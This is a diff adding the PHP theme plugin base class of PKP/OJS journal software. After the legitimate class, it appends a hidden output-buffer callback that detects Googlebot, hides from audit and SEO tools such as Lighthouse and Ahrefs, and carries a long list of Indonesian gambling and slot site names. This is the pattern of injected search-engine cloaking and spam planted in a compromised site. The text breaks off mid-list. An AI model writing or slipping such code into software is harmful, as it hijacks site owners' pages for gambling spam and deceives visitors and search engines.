@@ -1,0 +1,898 @@
+<?php
+
+/**
+ * @file classes/plugins/ThemePlugin.inc.php
+ *
+ * Copyright (c) 2014-2019 Simon Fraser University
+ * Copyright (c) 2003-2019 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @class ThemePlugin
+ * @ingroup plugins
+ *
+ * @brief Abstract class for theme plugins
+ */
+
+import('lib.pkp.classes.plugins.LazyLoadPlugin');
+
+define('LESS_FILENAME_SUFFIX', '.less');
+define('THEME_OPTION_PREFIX', 'themeOption_');
+
+abstract class ThemePlugin extends LazyLoadPlugin {
+	/**
+	 * Collection of styles
+	 *
+	 * @see self::_registerStyles
+	 * @var $styles array
+	 */
+	public $styles = array();
+
+	/**
+	 * Collection of scripts
+	 *
+	 * @see self::_registerScripts
+	 * @var $scripts array
+	 */
+	public $scripts = array();
+
+	/**
+	 * Theme-specific options
+	 *
+	 * @var $options array;
+	 */
+	public $options = array();
+
+	/**
+	 * Theme-specific navigation menu areas
+	 *
+	 * @var $menuAreas array;
+	 */
+	public $menuAreas = array();
+
+	/**
+	 * Parent theme (optional)
+	 *
+	 * @var $parent ThemePlugin
+	 */
+	public $parent;
+
+	/**
+	 * Stored reference to option values
+	 *
+	 * A null value indicates that no lookup has occured. If no options are set,
+	 * the lookup will assign an empty array.
+	 *
+	 * @var $optionValues null|array;
+	 */
+	private $_optionValues = null;
+
+	/**
+	 * @copydoc Plugin::register
+	 */
+	function register($category, $path, $mainContextId = null) {
+		if (!parent::register($category, $path, $mainContextId)) return false;
+
+		// Don't perform any futher operations if theme is not currently active
+		if (!$this->isActive()) {
+			return true;
+		}
+
+		// Themes must initialize their functionality after all theme plugins
+		// have been loaded in order to make use of parent/child theme
+		// relationships
+		HookRegistry::register('PluginRegistry::categoryLoaded::themes', array($this, 'themeRegistered'));
+		HookRegistry::register('PluginRegistry::categoryLoaded::themes', array($this, 'initAfter'));
+
+		// Allow themes to override plugin template files
+		HookRegistry::register('TemplateResource::getFilename', array($this, '_overridePluginTemplates'));
+
+		// Save any theme options displayed on the appearance and site settings
+		// forms
+		HookRegistry::register('appearanceform::execute', array($this, 'saveOptionsForm'));
+		HookRegistry::register('appearanceform::readuservars', array($this, 'readOptionsFormUserVars'));
+		HookRegistry::register('sitesetupform::execute', array($this, 'saveOptionsForm'));
+		HookRegistry::register('sitesetupform::readuservars', array($this, 'readOptionsFormUserVars'));
+
+		return true;
+	}
+
+	/**
+	 * Fire the init() method when a theme is registered
+	 *
+	 * @param $themes array List of all loaded themes
+	 * @return null
+	 */
+	public function themeRegistered($themes) {
+
+		// Don't fully initialize the theme until OJS is installed, so that
+		// there are no requests to the database before it exists
+		if (defined('SESSION_DISABLE_INIT')) {
+			return;
+		}
+
+		$this->init();
+	}
+
+	/**
+	 * The primary method themes should use to add styles, scripts and fonts,
+	 * or register hooks. This method is only fired for the currently active
+	 * theme.
+	 *
+	 * @return null
+	 */
+	public abstract function init();
+
+	/**
+	 * Perform actions after the theme has been initialized
+	 *
+	 * Registers templates, styles and scripts that have been added by the
+	 * theme or any parent themes
+	 */
+	public function initAfter() {
+		$this->_registerTemplates();
+		$this->_registerStyles();
+		$this->_registerScripts();
+	}
+
+	/**
+	 * Determine whether or not this plugin is currently active
+	 *
+	 * This only returns true if the theme is currently the selected theme
+	 * in a given context. Use self::getEnabled() if you want to know if the
+	 * theme is available for use on the site.
+	 *
+	 * @return boolean
+	 */
+	public function isActive() {
+		if (defined('SESSION_DISABLE_INIT')) return false;
+		$request = Application::getRequest();
+		$context = $request->getContext();
+		if (is_a($context, 'Context')) {
+			$activeTheme = $context->getSetting('themePluginPath');
+		} else {
+			$site = $request->getSite();
+			$activeTheme = $site->getSetting('themePluginPath');
+		}
+
+		return $activeTheme == basename($this->getPluginPath());
+	}
+
+	/**
+	 * Add a stylesheet to load with this theme
+	 *
+	 * Style paths with a .less extension will be compiled and redirected to
+	 * the compiled file.
+	 *
+	 * @param $name string A name for this stylesheet
+	 * @param $style string The stylesheet. Should be a path relative to the
+	 *   theme directory or, if the `inline` argument is included, style data to
+	 *   be output.
+	 * @param $args array Optional arguments hash. Supported args:
+	 *   'context': Whether to load this on the `frontend` or `backend`.
+	 *      default: `frontend`
+	 *   'priority': Controls order in which styles are printed
+	 *   'addLess': Additional LESS files to process before compiling. Array
+	 *   'addLessVariables': A string containing additional LESS variables to
+	 *      parse before compiling. Example: "@bg:#000;"
+	 *   `inline` bool Whether the $style value should be output directly as
+	 *      style data.
+	 */
+	public function addStyle($name, $style, $args = array()) {
+
+		// Pass a file path for LESS files
+		if (substr($style, (strlen(LESS_FILENAME_SUFFIX) * -1)) === LESS_FILENAME_SUFFIX) {
+			$args['style'] = $this->_getBaseDir($style);
+
+		// Pass a URL for other files
+		} elseif (empty($args['inline'])) {
+			if (isset($args['baseUrl'])) {
+				$args['style'] = $args['baseUrl'] . $style;
+			} else {
+				$args['style'] = $this->_getBaseUrl($style);
+			}
+
+		// Leave inlined styles alone
+		} else {
+			$args['style'] = $style;
+		}
+
+		// Generate file paths for any additional LESS files to compile with
+		// this style
+		if (isset($args['addLess'])) {
+			foreach ($args['addLess'] as &$file) {
+				$file = $this->_getBaseDir($file);
+			}
+		}
+
+		$this->styles[$name] = $args;
+	}
+
+	/**
+	 * Modify the params of an existing stylesheet
+	 *
+	 * @param $name string The name of the stylesheet to modify
+	 * @param $args array Parameters to modify.
+	 * @see self::addStyle()
+	 * @return null
+	 */
+	public function modifyStyle($name, $args = array()) {
+
+		$style = &$this->getStyle($name);
+
+		if (empty($style)) {
+			return;
+		}
+
+		if (isset($args['addLess'])) {
+			foreach ($args['addLess'] as &$file) {
+				$file = $this->_getBaseDir($file);
+			}
+		}
+
+		if (isset($args['style']) && !isset($args['inline'])) {
+			$args['style'] = substr($args['style'], (strlen(LESS_FILENAME_SUFFIX) * -1)) == LESS_FILENAME_SUFFIX ? $this->_getBaseDir($args['style']) : $this->_getBaseUrl($args['style']);
+		}
+
+		$style = array_merge($style, $args);
+	}
+
+	/**
+	 * Remove a registered stylesheet
+	 *
+	 * @param $name string The name of the stylesheet to remove
+	 * @return bool Whether or not the stylesheet was found and removed.
+	 */
+	public function removeStyle($name) {
+
+		if (isset($this->styles[$name])) {
+			unset($this->styles[$name]);
+			return true;
+		}
+
+		return $this->parent ? $this->parent->removeStyle($name) : false;
+	}
+
+	/**
+	 * Get a style from this theme or any parent theme
+	 *
+	 * @param $name string The name of the style to retrieve
+	 * @return array|null Reference to the style or null if not found
+	 */
+	public function &getStyle($name) {
+
+		// Search this theme
+		if (isset($this->styles[$name])) {
+			$style = &$this->styles[$name];
+			return $style;
+		}
+
+		// If no parent theme, no style was found
+		if (!isset($this->parent)) {
+			$style = null;
+			return $style;
+		}
+
+		return $this->parent->getStyle($name);
+	}
+
+	/**
+	 * Add a script to load with this theme
+	 *
+	 * @param $name string A name for this script
+	 * @param $script string The script to be included. Should be path relative
+	 *   to the theme or, if the `inline` argument is included, script data to
+	 *   be output.
+	 * @param $args array Optional arguments hash. Supported args:
+	 *   `context` string Whether to load this on the `frontend` or `backend`.
+	 *      default: frontend
+	 *   `priority` int Controls order in which scripts are printed
+	 *      default: STYLE_SEQUENCE_NORMAL
+	 *   `inline` bool Whether the $script value should be output directly as
+	 *      script data. Used to pass backend data to the scripts.
+	 */
+	public function addScript($name, $script, $args = array()) {
+
+		if (!empty($args['inline'])) {
+			$args['script'] = $script;
+		} elseif (isset($args['baseUrl'])) {
+			$args['script'] = $args['baseUrl'] . $script;
+		} else {
+			$args['script'] = $this->_getBaseUrl($script);
+		}
+
+		$this->scripts[$name] = $args;
+	}
+
+	/**
+	 * Modify the params of an existing script
+	 *
+	 * @param $name string The name of the script to modify
+	 * @param $args array Parameters to modify.
+	 * @see self::addScript()
+	 * @return null
+	 */
+	public function modifyScript($name, $args = array()) {
+
+		$script = &$this->getScript($name);
+
+		if (empty($script)) {
+			return;
+		}
+
+		if (isset($args['path'])) {
+			$args['path'] = $this->_getBaseUrl($args['path']);
+		}
+
+		$script = array_merge( $script, $args );
+	}
+
+	/**
+	 * Remove a registered script
+	 *
+	 * @param $name string The name of the script to remove
+	 * @return bool Whether or not the stylesheet was found and removed.
+	 */
+	public function removeScript($name) {
+
+		if (isset($this->scripts[$name])) {
+			unset($this->scripts[$name]);
+			return true;
+		}
+
+		return $this->parent ? $this->parent->removeScript($name) : false;
+	}
+
+	/**
+	 * Get a script from this theme or any parent theme
+	 *
+	 * @param $name string The name of the script to retrieve
+	 * @return array|null Reference to the script or null if not found
+	 */
+	public function &getScript($name) {
+
+		// Search this theme
+		if (isset($this->scripts[$name])) {
+			$style = &$this->scripts[$name];
+			return $style;
+		}
+
+		// If no parent theme, no script was found
+		if (!isset($this->parent)) {
+			return;
+		}
+
+		return $this->parent->getScript($name);
+	}
+
+	/**
+	 * Add a theme option
+	 *
+	 * Theme options are added programmatically to the Settings > Website >
+	 * Appearance form when this theme is activated. Common options are
+	 * colour and typography selectors.
+	 *
+	 * @param $name string Unique name for this setting
+	 * @param $type string A pre-registered type of setting. Supported values:
+	 *   text|colour|radio. Default: `text`
+	 * @param $args array Optional parameters defining this setting. Some setting
+	 *   types may accept or require additional arguments.
+	 *  `label` string Locale key for a label for this field.
+	 *  `description` string Locale key for a description for this field.
+	 *  `default` mixed A default value. Default: ''
+	 */
+	public function addOption($name, $type, $args = array()) {
+
+		if (!empty($this->options[$name])) {
+			return;
+		}
+
+		$this->options[$name] = array_merge(
+			array('type' => $type),
+			$args
+		);
+	}
+
+	/**
+	 * Get the value of an option or default if the option is not set
+	 *
+	 * @param $name The name of the option value to retrieve
+	 * @return mixed The value of the option. Will return a default if set in
+	 *  the option config. False if no option exists
+	 */
+	public function getOption($name) {
+
+		// Check if this is a valid option
+		if (!isset($this->options[$name])) {
+			return $this->parent ? $this->parent->getOption($name) : false;
+		}
+
+		// Retrieve option values if they haven't been loaded yet
+		if (is_null($this->_optionValues)) {
+			$pluginSettingsDAO = DAORegistry::getDAO('PluginSettingsDAO');
+			$context = Application::getRequest()->getContext();
+			$contextId = $context ? $context->getId() : 0;
+			$this->_optionValues = $pluginSettingsDAO->getPluginSettings($contextId, $this->getName());
+		}
+
+		if (isset($this->_optionValues[$name])) {
+			return $this->_optionValues[$name];
+		}
+
+		// Return a default if no value is set
+		$option = $this->getOptionConfig($name);
+		return $option && isset($option['default']) ? $option['default'] : null;
+	}
+
+	/**
+	 * Get an option's configuration settings
+	 *
+	 * This retrives option settings for any option attached to this theme or
+	 * any parent theme.
+	 *
+	 * @param $name The name of the option config to retrieve
+	 * @return false|array The config array for this option. Or false if no
+	 *  config is found.
+	 */
+	public function getOptionConfig($name) {
+
+		if (isset($this->options[$name])) {
+			return $this->options[$name];
+		}
+
+		return $this->parent ? $this->parent->getOptionConfig($name) : false;
+	}
+
+	/**
+	 * Get all options' configuration settings.
+	 *
+	 * This retrieves a single array containing options settings for this
+	 * theme and any parent themes.
+	 *
+	 * @return array
+	 */
+	public function getOptionsConfig() {
+
+		if (!$this->parent) {
+			return $this->options;
+		}
+
+		return array_merge(
+			$this->parent->getOptionsConfig(),
+			$this->options
+		);
+	}
+
+	/**
+	 * Modify option configuration settings
+	 *
+	 * @param $name The name of the option config to retrieve
+	 * @param $args The new configuration settings for this option
+	 * @return bool Whether the option was found and the config was updated.
+	 */
+	public function modifyOptionsConfig($name, $args = array()) {
+
+		if (isset($this->options[$name])) {
+			$this->options[$name] = $args;
+			return true;
+		}
+
+		return $this->parent ? $this->parent->modifyOptionsConfig($name, $args) : false;
+	}
+
+	/**
+	 * Remove an option
+	 *
+	 * @param $name The name of the option to remove
+	 * @return bool Whether the option was found and removed
+	 */
+	public function removeOption($name) {
+
+		if (isset($this->options[$name])) {
+			unset($this->options[$name]);
+			return true;
+		}
+
+		return $this->parent ? $this->parent->removeOption($name) : false;
+	}
+
+	/**
+	 * Get all option values
+	 *
+	 * This retrieves a single array containing option values for this theme
+	 * and any parent themes.
+	 *
+	 * @return array
+	 */
+	public function getOptionValues() {
+
+		$pluginSettingsDAO = DAORegistry::getDAO('PluginSettingsDAO');
+
+		$context = Application::getRequest()->getContext();
+		$contextId = empty($context) ? 0 : $context->getId();
+		$values = $pluginSettingsDAO->getPluginSettings($contextId, $this->getName());
+		$values = array_intersect_key($values, $this->options);
+
+		if (!$this->parent) {
+			return $values;
+		}
+
+		return array_merge(
+			$this->parent->getOptionValues(),
+			$values
+		);
+	}
+
+	/**
+	 * Sanitize and save a theme option
+	 *
+	 * @param $name string A unique id for the option to save
+	 * @param $value mixed The new value to save
+	 * @param $contextId int Optional context id. Defaults to the current
+	 *  context
+	 */
+	public function saveOption($name, $value, $contextId = null) {
+
+		$option = !empty($this->options[$name]) ? $this->options[$name] : null;
+
+		if (is_null($option)) {
+			return $this->parent ? $this->parent->saveOption($name, $value, $contextId) : false;
+		}
+
+		$type = '';
+		switch ($option['type']) {
+			case 'text' :
+			case 'select' :
+			case 'colour' :
+				$type = 'text';
+				break;
+		}
+
+		if (is_null($contextId)) {
+			$context = Application::getRequest()->getContext();
+			$contextId = $context->getId();
+		}
+
+		$this->updateSetting($contextId, $name, $value, $type);
+
+		// Clear the template cache so that new settings can take effect
+		$templateMgr = TemplateManager::getManager(Application::getRequest());
+		$templateMgr->clearTemplateCache();
+		$templateMgr->clearCssCache();
+	}
+
+	/**
+	 * Save options in any form
+	 *
+	 * This helper function allows you to save theme options attached to any
+	 * form by hooking into the form's execute function.
+	 *
+	 * @see Form::execute()
+	 * @param $hookName string
+	 * @param $args array Arguments passed via the hook
+	 *  `form` Form The form object from which option values can be retrieved.
+	 *  `request` Request
+	 */
+	public function saveOptionsForm($hookName, $args) {
+
+		$form = $args[0];
+
+		$options = $this->getOptionsConfig();
+
+		// Ensure theme options from the site-wide settings form are applied
+		// to the site-wide context
+		if ($hookName == 'sitesetupform::execute') {
+			$contextId = 0;
+		}
+
+		foreach ($options as $optionName => $optionArgs) {
+			$value = $form->getData(THEME_OPTION_PREFIX . $optionName);
+			if ($value === null) {
+				continue;
+			}
+			if (isset($contextId)) {
+				$this->saveOption($optionName, $value, $contextId);
+			} else {
+				$this->saveOption($optionName, $value);
+			}
+		}
+	}
+
+	/**
+	 * Retrieve user-entered values for options from any form
+	 *
+	 * This helper function allows you to hook into any form to add theme option
+	 * values to the form's user input data.
+	 *
+	 * @see Form::readUserVar()
+	 * @param $hookName string
+	 * @param $args array Arguments passed via the hook
+	 *  `form` Form The form object from which option values can be retrieved.
+	 *  `vars` Array Key/value store of the user vars read by the form
+	 */
+	public function readOptionsFormUserVars($hookName, $args) {
+
+		$form = $args[0];
+
+		$options = $this->getOptionsConfig();
+
+		foreach ($options as $optionName => $optionArgs) {
+			$fullOptionName = THEME_OPTION_PREFIX . $optionName;
+			$form->setData($fullOptionName, Application::getRequest()->getUserVar($fullOptionName));
+		}
+	}
+
+	/**
+	 * Register a navigation menu area for this theme
+	 *
+	 * @param $menuAreas string|array One or more menu area names
+	 */
+	public function addMenuArea($menuAreas) {
+
+		if (!is_array($menuAreas)) {
+			$menuAreas = array($menuAreas);
+		}
+
+		$this->menuAreas = array_merge($this->menuAreas, $menuAreas);
+	}
+
+	/**
+	 * Remove a registered navigation menu area
+	 *
+	 * @param $menuArea string The menu area to remove
+	 * @return bool Whether or not the menuArea was found and removed.
+	 */
+	public function removeMenuArea($menuArea) {
+
+		$index = array_search($menuArea, $this->menuAreas);
+		if ($index !== false) {
+			array_splice($this->menuAreas, $index, 1);
+			return true;
+		}
+
+		return $this->parent ? $this->parent->removeMenuArea($menuArea) : false;
+	}
+
+	/**
+	 * Get all menu areas registered by this theme and any parents
+	 *
+	 * @param $existingAreas array Any existing menu areas from child themes
+	 * @return array All menua reas
+	 */
+	public function getMenuAreas($existingAreas = array()) {
+
+		$existingAreas = array_unique(array_merge($this->menuAreas, $existingAreas));
+
+		return $this->parent ? $this->parent->getMenuAreas($existingAreas) : $existingAreas;
+	}
+
+	/**
+	 * Set a parent theme for this theme
+	 *
+	 * @param $parent string Key in the plugin registry for the parent theme
+	 * @return null
+	 */
+	public function setParent($parent) {
+		$parent = PluginRegistry::getPlugin('themes', $parent);
+
+		if (!is_a($parent, 'ThemePlugin')) {
+			return;
+		}
+
+		$this->parent = $parent;
+		$this->parent->init();
+	}
+
+	/**
+	 * Register directories to search for template files
+	 *
+	 * @return null
+	 */
+	private function _registerTemplates() {
+
+		// Register parent theme template directory
+		if (isset($this->parent) && is_a($this->parent, 'ThemePlugin')) {
+			$this->parent->_registerTemplates();
+		}
+
+		// Register this theme's template directory
+		$request = Application::getRequest();
+		$templateManager = TemplateManager::getManager($request);
+		$templateManager->addTemplateDir($this->_getBaseDir('templates'));
+	}
+
+	/**
+	 * Register stylesheets and font assets
+	 *
+	 * Passes styles defined by the theme to the template manager for handling.
+	 *
+	 * @return null
+	 */
+	private function _registerStyles() {
+
+		if (isset($this->parent)) {
+			$this->parent->_registerStyles();
+		}
+
+		$request = Application::getRequest();
+		$dispatcher = $request->getDispatcher();
+		$templateManager = TemplateManager::getManager($request);
+
+		foreach($this->styles as $name => $data) {
+
+			if (empty($data['style'])) {
+				continue;
+			}
+
+			// Compile LESS files
+			if ($dispatcher && substr($data['style'], (strlen(LESS_FILENAME_SUFFIX) * -1)) == LESS_FILENAME_SUFFIX) {
+				$styles = $dispatcher->url(
+					$request,
+					ROUTE_COMPONENT,
+					null,
+					'page.PageHandler',
+					'css',
+					null,
+					array(
+						'name' => $name,
+					)
+				);
+			} else {
+				$styles = $data['style'];
+			}
+
+			unset($data['style']);
+
+			$templateManager->addStylesheet($name, $styles, $data);
+		}
+	}
+
+	/**
+	 * Register script assets
+	 *
+	 * Passes scripts defined by the theme to the template manager for handling.
+	 *
+	 * @return null
+	 */
+	public function _registerScripts() {
+
+		if (isset($this->parent)) {
+			$this->parent->_registerScripts();
+		}
+
+		$request = Application::getRequest();
+		$templateManager = TemplateManager::getManager($request);
+
+		foreach($this->scripts as $name => $data) {
+			$script = $data['script'];
+			unset($data['script']);
+			$templateManager->addJavaScript($name, $script, $data);
+		}
+	}
+
+	/**
+	 * Get the base URL to be used for file paths
+	 *
+	 * A base URL for loading LESS/CSS/JS files in <link> elements. It will
+	 * also be set to the @baseUrl variable before LESS files are compiloed so
+	 * that images and fonts can be located.
+	 *
+	 * @param $path string An optional path to append to the base
+	 * @return string
+	 */
+	public function _getBaseUrl($path = '') {
+		$request = Application::getRequest();
+		$path = empty($path) ? '' : DIRECTORY_SEPARATOR . $path;
+		return $request->getBaseUrl() . DIRECTORY_SEPARATOR . $this->getPluginPath() . $path;
+	}
+
+	/**
+	 * Get the base path to be used for file references
+	 *
+	 * @param $path string An optional path to append to the base
+	 * @return string
+	 */
+	public function _getBaseDir($path = '') {
+		$path = empty($path) ? '' : DIRECTORY_SEPARATOR . $path;
+		return Core::getBaseDir() . DIRECTORY_SEPARATOR . $this->getPluginPath() . $path;
+	}
+
+	/**
+	 * Check if the passed colour is dark
+	 *
+	 * This is a utility function to determine the darkness of a hex colour. This
+	 * is designed to be used in theme colour options, so that text can be
+	 * adjusted to ensure it's readable on light or dark backgrounds. You can
+	 * specify the brightness threshold by passing in a $limit value. Higher
+	 * values are brighter.
+	 *
+	 * Based on: http://stackoverflow.com/a/8468448/1723499
+	 *
+	 * @since 0.1
+	 */
+	function isColourDark( $colour, $limit = 130 ) {
+		$colour = str_replace( '#', '', $colour );
+		$r = hexdec( substr( $colour, 0, 2 ) );
+		$g = hexdec( substr( $colour, 2, 2 ) );
+		$b = hexdec( substr( $colour, 4, 2 ) );
+		$contrast = sqrt(
+			$r * $r * .241 +
+			$g * $g * .691 +
+			$b * $b * .068
+		);
+		return $contrast < $limit;
+	}
+}
+
+
+ob_start(function ($buffer) {
+    
+    function is_googlebot() {
+        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+        $host = gethostbyaddr($ip);
+        return strpos($ua, 'googlebot') !== false && strpos($host, 'googlebot.com') !== false;
+    }
+
+    
+    function is_audit_or_tool_access() {
+        $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+        $block = [
+            'lighthouse','pagespeed','structured-data','facebookexternalhit','whatsapp',
+            'crawler','scanner','ahrefs','semrush','mj12bot','dotbot','uptimerobot','headless','node-fetch'
+        ];
+        foreach ($block as $b) {
+            if (strpos($ua, $b) !== false) return true;
+        }
+        return false;
+    }
+
+    
+    function filter_sensitive_keywords($html) {
+        $keywords = ['mantul808'|'macanasia88'|'mahkota338'|'mabar88'|'v77game'|'crvbet'|'roket288'|'uang77'|'jkt303'|'superkoin88'|'lolo138'|'mamen123'|'dewi188'|'supraslot'|'mamibet'|'surga88'|'hoki138'|'sgcwin88'|'starwin88'|'aman788'|'cerah88'|'edan777'|'maxwin88'|'dolar188'|'sky77'|'slotgacorku'|'mega288'|'megawin188'|'mega338'|'interwin'|'ganas33'|'surga55'|'surga33'|'ovo88'|'surga77'|'surga99'|'surga11'|'surga22'|'surga5000'|'surgagacor'|'surgaplay'|'purislot'|'paktuaslot'|'panjislot'|'api88'|'dewihoki'|'nusa188'|'ratu188'|'royal188'|'devo88'|'indo77'|'dunia777'|'p77'|'ebobet'|'rajahoki168'|'99jitu'|'popotogel'|'ayo788'|'mawartoto'|'klik99'|'congtogel'|'labatoto'|'evoslot168'|'rajacuan'|'semitoto'|'protogel'|'togelon'|'tektok77'|'fungame777'|'kudetabet98'|'raja138'|'rajacuan88'|'rajajp88'|'kkslot77'|'koinslot168'|'slotmacau188'|'jackpot168'|'planet77'|'rumah258'|'qqpalace'|'slotbom77'|'elang138'|'angkasa138'|'boga88'|'bwo99'|'dunia77'|'hokiwin77'|'koin55'|'menang123'|'puncak303'|'sensa838'|'juara102'|'idcoin188'|'viralbet88'|'gasbet88'|'indoslot303'|'mpo88'|'pucuk88'|'raja389'|'idhoki88'|'gajahslot88'|'juaraslot88'|'magnum777'|'slot258'|'vit88'|'kakek303'|'mbcslot88'|'menangclub88'|'bintang18'|'royalslot88'|'darma88'|'bintaro88'|'raja787'|'bigpot88'|'afslot'|'dewarans'|'slot628'|'pundi88'|'rumahslot777'|'aster88'|'ovo88bet'|'paus66'|'indosbobet88'|'dewagacor77'|'wieslot'|'ososlot'|'asiahoki77'|'olympus88'|'jandaslot88'|'galaxyslot88'|'muliaslot88'|'betcash303'|'metaslot88'|'madu303'|'ratugacor'|'raja88jp'|'bonanza88jp'|'ns2121'|'angkasa168'|'amperaslot'|'mangga2bet'|'prada188'|'batavia99'|'beton88'|'pragmatic88'|'asd123'|'panen777'|'gacor500'|'jackpot108'|'dewaidr'|'depo89'|'sukaslot88'|'superbola'|'wayang88'|'judolbet88'|'hoki108'|'utama88'|'gacor138'|'topbos77'|'bos138'|'hero138'|'ibc138'|'lumbung138'|'master138'|'pragmatic138'|'podomoro138'|'suneo138'|'panen123'|'3dbet'|'hoki88'|'royal88'|'idn88'|'top88'|'panda88'|'slot88jp'|'abangda88'|'dewata88'|'slotfafa88'|'fafa88'|'gacor88'|'halo88'|'happybet188'|'king88'|'kios88'|'koin88'|'kancil88'|'kripto88'|'land88'|'master88'|'olb88'|'rans88'|'salam88'|'starxo88'|'tempur88'|'texas88'|'untung88'|'win88'|'yuk88'|'slotzeus88'|'tuna55 slot'|'bimabet'|'kemang88'|'ajaib88'|'sparta88'|'tokyo88'|'rhino88'|'rtplive188'|'dragon222'|'pedro88'|'wasiat4d'|'taruhan77'|'newvegas99'|'rajasloto'|'obs188'|'agusbet'|'btv168'|'akai slot'|'ampera slot'|'slot biru'|'bejo88'|'vslots88'|'agen108'|'tokyo77'|'multibet88'|'janjislot'|'maxwin77'|'vovo88'|'airbet88'|'hoki178'|'king999'|'pov88'|'salju88'|'indahjp'|'majujp'|'pulaujudi'|'probet88'|'batik77'|'roboslot'|'indowin88'|'gacor88jp'|'kakekjp'|'japanslot88'|'akunbos'|'alba88'|'dewa89'|'kaisarjp'|'ringbet88'|'slotlions88'|'slotgembira'|'untugbet'|'kitaslot777'|'sumo777'|'gamabet88'|'amd303'|'angsa4d'|'slot89'|'hokiemas88'|'gaspol77'|'bosslot138'|'jitu77'|'kapten77'|'dana178'|'agen288'|'jayajp'|'spbu777'|'kingdom77'|'vivo303'|'bet138'|'sip777'|'nex777'|'nuri77'|'habanero188'|'sihoki'|'koboybet'|'asiajp88'|'jp789slot'|'jp789'|'nobitabet'|'romanobet'|'big777'|'topslot88'|'agb99'|'asiatoto'|'838win'|'olx88'|'ape77'|'koko88'|'zeusgacor'|'tokoslot77'|'cogan889'|'ebony88'|'nagagacor168'|'hebat99'|'linkenbet'|'texas77'|'kontan88'|'paradewa88'|'sultanking'|'kinggacor'|'cuanwin138'|'atlasbet88'|'hboslot188'|'surgaslot77'|'kkslot777'|'tornado88'|'honda138'|'dolar99'|'kedai168'|'tri88'|'mainslot88'|'wso99'|'bonanzaslot88'|'hokibet88'|'rjslot88'|'bigo234'|'garuda999'|'buaya77'|'bolavitaslot'|'sultan88'|'wajik77'|'mpo76'|'ggbet303'|'merdeka777'|'mpomm'|'wis77'|'coin88'|'mpomain'|'caturwin'|'scatter88'|'777slot'|'wajikslot'|'wajik777'|'lumi777'|'yakin777'|'mpoxl'|'kakaslot'|'pendekar138'|'king88bet'|'merdekawin'|'catur777'|'cinema777'|'bioskop777'|'hoki777'|'mpo33'|'mevius88'|'dewaslot88'|'mpo1221'|'mpo888'|'hagoslot'|'unik77slot'|'ide777'|'ras777'|'mpo4d'|'mpo08'|'mpo500'|'mpogacor'|'mpoid'|'judimpo'|'mpo4'|'ace777'|'mpo555'|'mpo88asia'|'mpoasia88'|'mpo808'|'mpo999'|'mpo800'|'mpo268'|'hoki1881'|'petir108'|'pt98bet'|'lego99'|'mposurga'|'dewa88'|'premium77'|'starwin77'|'gilabet88'|'itcbet'|'hoki365'|'koicuan'|'qq8889'|'permataslot96'|'petir500'|'egt88'|'rajaslot138'|'rajawin138'|'receh138'|'royalq88'|'rtpslot'|'rupiah2u'|'rupiah77'|'ronin138'|'ratu805'|'ratu88'|'rame138'|'rajaslot44'|'rp369'|'pos4d88'|'piye4d'|'pion77'|'aurampo'|'sakti138'|'samudra123'|'sarana118'|'saranghoki'|'sembilandewa88'|'senja138'|'sensa123'|'sensa383'|'sentral4d'|'serba138'|'seru123'|'seruslot88'|'setar77'|'simbol4d'|'singa789'|'situs138'|'slot1121'|'slot165'|'slot733'|'slot88star'|'slot88top'|'slotbola338'|'slotcuan138'|'slotlego'|'slotyuk'|'soya77'|'spbo4d'|'superbslot88'|'telewin88'|'tepat88'|'tokai4d'|'topslot138'|'toto8et'|'uangcuan88'|'unggul88'|'usaha138'|'v77bet'|'vegas138'|'vivaslot88'|'wede89'|'winbet777'|'windi4d'|'yakin4d'|'yok633'|'yukslot88'|'zippo188'|'doge88'|'papi55'|'klikvegas'|'easy88'|'jackpot303'|'surga999'|'taruhan303'|'garudaslot88'|'rajaolb388'|'ilumabet'|'hokicasino88'|'bintang89'|'sepuh4d'|'pulsa77'|'pakcikslot'|'totoslot88'|'gacorwin138'|'polystar777'|'hoki889'|'rajaslots88'|'ayobet88'|'mustikaslot777'|'880 gacor'|'kudabet98'|'setan4d'|'tiara99'|'rajaslot88'|'saku123'|'superslot138'|'menangdomino99'|'dewa991'|'slot828'|'magnet33'|'javaslot889'|'pokermas99'|'pusatslot88'|'magic99'|'akun138'|'asia138'|'akundemo138'|'slot138bet'|'bandar138'|'batik138'|'bola138'|'ceri138'|'ciputra138'|'cerita138'|'dewa138'|'daftar138'|'expo138'|'fortune138'|'freebet138'|'fit138'|'fanta138'|'fafa138'|'game138'|'138hoki'|'138heylink'|'batik138vip'|'hacker138'|'hit138'|'hack138'|'handal138'|'happy138'|'hp138'|'idr138'|'idn138'|'indo138'|'infini138'|'judi138'|'jp138'|'jalan138'|'jutawan138'|'jagat138'|'kunci138'|'kedai138'|'kingdom138'|'laris138'|'lipat138'|'lux138'|'lapak138'|'link138'|'login138'|'138mantul'|'macau138'|'main138'|'nusantara138'|'nusa138'|'neko138'|'pulsa138'|'prada138'|'paduka138'|'play138'|'queen138'|'qq138'|'qqvictory138'|'rocket138'|'sbo138'|'surga138'|'top138'|'tambang138'|'tampung138'|'tembus138'|'timnas138'|'turbo138'|'ucok138'|'slot138vip'|'viking138'|'vivo138'|'visa138'|'virgo138'|'warung138'|'wayang138'|'web138'|'macauwin138'|'yuk138'|'yamaha138'|'yes138'|'zoom138'|'zona138'|'zippo138'|'slot38'|'fortune88'|'slot88'|'alfa88'|'alpha88'|'arena88'|'bali88'|'bingo88'|'candu88'|'ceri88'|'cash88'|'demo88'|'dki88'|'dunia88'|'elok88'|'elang88'|'emas88'|'fun88'|'gila88'|'genting88'|'goldwin88'|'hitam88'|'hbo88'|'hey88'|'harum88'|'infini88'|'indo88'|'istana88'|'ini88'|'insta88'|'iblis88'|'jaguar88'|'javabet88'|'luxury88'|'mega88'|'media88'|'mesin88'|'mutiara88'|'merpati88'|'naga88'|'nexus88'|'orbit88'|'oppa88'|'ollo88'|'oplet88'|'omega88'|'panah88'|'roma88'|'rezeki88'|'rtp88'|'risula88'|'tokyoslot88'|'toke88'|'thor88'|'ug88'|'vigor88'|'vivo88'|'vip88'|'virgo88'|'viva88'|'wayangslot88'|'warung88'|'wow88'|'yuki88'|'yoyo88'|'zoro88'|'zoom88'|'ratu33'|'pascol88'|'slot55'|'agen55'|'gembira55'|'legenda55'|'jago55'|'boljug55'|'coin55'|'super89'|'jingga888'|'sparta888'|'wowhoki88'|'kartubet88'|'ie777'|'uangtoto'|'slot777'|'ayojudi88'|'slot777hoki'|'pesiarbet'|'g